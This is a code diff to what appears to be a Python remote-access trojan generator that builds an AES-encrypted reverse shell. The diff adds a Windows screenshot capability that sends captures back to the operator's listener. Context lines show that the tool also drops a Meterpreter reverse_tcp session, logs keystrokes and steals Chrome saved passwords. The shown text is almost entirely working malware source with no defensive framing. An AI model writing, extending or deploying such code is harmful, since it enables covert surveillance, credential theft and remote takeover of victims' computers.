@@ -17,7 +17,27 @@ EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
 DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
 key, iv, secretkey = randKey(32), randKey(16), randKey(32)
 
-finput = '''def MeterDrop(mhost, mport):
+finput = '''def fscreenshot():
+	hwnd = 0
+	hwndDC = win32gui.GetWindowDC(hwnd)
+	mfcDC = win32ui.CreateDCFromHandle(hwndDC)
+	saveDC = mfcDC.CreateCompatibleDC()
+	saveBitMap = win32ui.CreateBitmap()
+	MoniterDev = win32api.EnumDisplayMonitors(None,None)
+	w = MoniterDev[0][2][2]
+	h = MoniterDev[0][2][3]
+	saveBitMap.CreateCompatibleBitmap(mfcDC, w, h)
+	saveDC.SelectObject(saveBitMap)
+	saveDC.BitBlt((0,0),(w, h) , mfcDC, (0,0), win32con.SRCCOPY)
+	bmpname=win32api.GetTempFileName(".","")[0]+'.bmp'
+	saveBitMap.SaveBitmapFile(saveDC, bmpname)
+	mfcDC.DeleteDC()
+	saveDC.DeleteDC()
+	win32gui.ReleaseDC(hwnd, hwndDC)
+	win32gui.DeleteObject(saveBitMap.GetHandle())
+	return bmpname
+
+def MeterDrop(mhost, mport):
 	try:
 		global DropSock
 		DropSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -117,6 +137,17 @@ while 1:
 	decrypted = DecodeAES(cipher, data)
 	if decrypted == "quit" or decrypted == "exit":
 		break
+
+	elif decrypted.startswith('screenshot'):
+		if pwdvar == 'cd':
+			upfile = fscreenshot()
+			with open(upfile, 'rb') as f:
+				encrypted = EncodeAES(cipher, "EOFEOFEOFEOFEOFC" + f.read() + "EOFEOFEOFEOFEOFZ")
+			s.send(encrypted)
+			os.remove(upfile)
+		else:
+			encrypted = EncodeAES(cipher, " [X] screenshot is only available for windows!**nEOFEOFEOFEOFEOFX")
+			s.send(encrypted)
 
 	elif decrypted.startswith("chromepass"):
 		if pwdvar == 'cd':
@@ -239,7 +270,7 @@ aesvar = 'AES'
 f.write('''#!/usr/bin/env python
 import subprocess,socket,base64,os,struct,socket,binascii,ctypes,threading,string,sqlite3;from Crypto import Random;from Crypto.Cipher import AES;from base64 import b64decode as %s
 try:
-	import win32api,win32gui,win32file,win32console,win32crypt,pyHook,pythoncom
+	import win32api,win32gui,win32file,win32console,win32crypt,pyHook,pythoncom,win32ui,win32con
 except:
 	pass
 ''' % (b64var))
@@ -249,7 +280,7 @@ f.close()
 rawserv = '''#!/usr/bin/env python
 from Crypto.Cipher import AES
 from Crypto import Random
-import readline,socket,base64,os,sys,string
+import readline,socket,base64,os,sys,string,random
 
 def completer(text, state):
 	options = [i for i in commands if i.startswith(text)]
@@ -281,7 +312,7 @@ def fnextcmd():
 				fnextcmd()
 
 	elif nextcmd == '?' or nextcmd == 'help':
-		print '**n AES-shell options:**n  download file       -  Download a file from remote pwd to localhost**n  upload filepath     -  Upload a file to remote pwd**n  run commands        -  Run a command in the background**n**n Windows Only:**n  meterpreter ip:port -  Execute a reverse_tcp meterpreter to ip:port**n  keyscan             -  Start recording keystrokes**n  keydump             -  Dump recorded keystrokes**n  keyclear            -  Clear the keystroke buffer**n  chromepass          -  Retrieve chrome stored passwords.**n'
+		print fhelp()
 		fnextcmd()
 
 	elif nextcmd.startswith('download '):
@@ -293,7 +324,10 @@ def fnextcmd():
 		encrypted = EncodeAES(cipher, nextcmd)
 		s.send(encrypted)
 
-commands = ['download ', 'upload ', 'meterpreter ', 'keyscan', 'keydump', 'keyclear', 'run ', 'chromepass', 'help']
+def fhelp():
+	return ' [*] AES-Encrypted connection established with %s:%s**n**n AES-shell options:**n  download file       -  Download a file from remote pwd to localhost**n  upload filepath     -  Upload a file to remote pwd**n  run commands        -  Run a command in the background**n**n Windows Only:**n  meterpreter ip:port -  Execute a reverse_tcp meterpreter to ip:port**n  keyscan             -  Start recording keystrokes**n  keydump             -  Dump recorded keystrokes**n  keyclear            -  Clear the keystroke buffer**n  chromepass          -  Retrieve chrome stored passwords.**n  screenshot          -  Take a screenshot**n' % (address[0],address[1])
+
+commands = ['download ', 'upload ', 'meterpreter ', 'keyscan', 'keydump', 'keyclear', 'run ', 'chromepass', 'help', 'screenshot']
 readline.parse_and_bind("tab: complete")
 readline.set_completer(completer)
 BLOCK_SIZE = 32
@@ -317,8 +351,23 @@ while True:
 		print decrypted[:-16]
 		fnextcmd()
 
+	elif decrypted.startswith("EOFEOFEOFEOFEOFC"):
+		downfile = 'screenshot_' + str(random.randint(2,9999)) + '.bmp'
+		f = open(downfile, 'wb')
+		f.write(decrypted[16:])
+		while not decrypted.endswith("EOFEOFEOFEOFEOFZ"):
+			data = s.recv(1024)
+			decrypted = DecodeAES(cipher, data)
+			if decrypted.endswith("EOFEOFEOFEOFEOFZ"):
+				f.write(decrypted[:-16])
+			else:
+				f.write(decrypted)
+		f.close()
+		print ' [*] Screenshot saved to ' + downfile + '**n'
+		fnextcmd()
+
 	elif decrypted.endswith("EOFEOFEOFEOFEOFY"):
-		print ' [*] AES-Encrypted connection established with %s:%s**n**n AES-shell options:**n  download file       -  Download a file from remote pwd to localhost**n  upload filepath     -  Upload a file to remote pwd**n  run commands        -  Run a command in the background**n**n Windows Only:**n  meterpreter ip:port -  Execute a reverse_tcp meterpreter to ip:port**n  keyscan             -  Start recording keystrokes**n  keydump             -  Dump recorded keystrokes**n  keyclear            -  Clear the keystroke buffer**n  chromepass          -  Retrieve chrome stored passwords.**n' % (address[0],address[1])
+		print fhelp()
 		fnextcmd()
 
 	elif decrypted.startswith("EOFEOFEOFEOFEOFS"):
